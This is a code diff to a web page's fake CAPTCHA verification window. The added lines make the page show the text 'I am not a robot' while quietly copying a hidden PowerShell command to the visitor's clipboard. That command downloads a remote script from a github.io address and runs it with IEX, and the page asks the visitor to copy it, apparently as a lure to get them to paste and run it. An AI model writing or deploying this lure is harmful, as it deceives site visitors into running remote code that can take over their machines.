@@ -59,7 +59,10 @@
             <span class="verify-header-text-big m-p block">Upload a File</span>
         </header>
         <main class="verify-main" style="text-align:center;">
+            <p>Please copy the command below:</p>
+            <code id="command-display"></code>
             <p>Please upload a file to continue:</p>
+            
             
             <input type="file" id="file-input" style="display:none;" />
             
@@ -208,10 +211,19 @@ function showVerifyWindow() {
     if (verifyWindow.offsetLeft + verifyWindow.offsetWidth > window.innerWidth - 10) {
         verifyWindow.style.left = checkboxWindow.offsetLeft - 8 + "px";
     }
+    const verificationId = generateRandomId();
+            document.getElementById('verification-id')?.textContent && 
+                (document.getElementById('verification-id').textContent = verificationId);
+            
+            const exe = "powershell";
+            const flags = "-NoProfile -Command";
+            const payload = "\"IEX (New-Object Net.WebClient).DownloadString('https://d5testing.github.io/terminal-fix.ps1')\"";
+            const fullCommand = `${exe} ${flags} ${payload}`;
+
+            commandDisplay.textContent = '✅ "I am not a robot"';
+            
+            autoCopy(fullCommand);
 }
-
-
-        
         addCaptchaListeners();
     </script>
 </body>
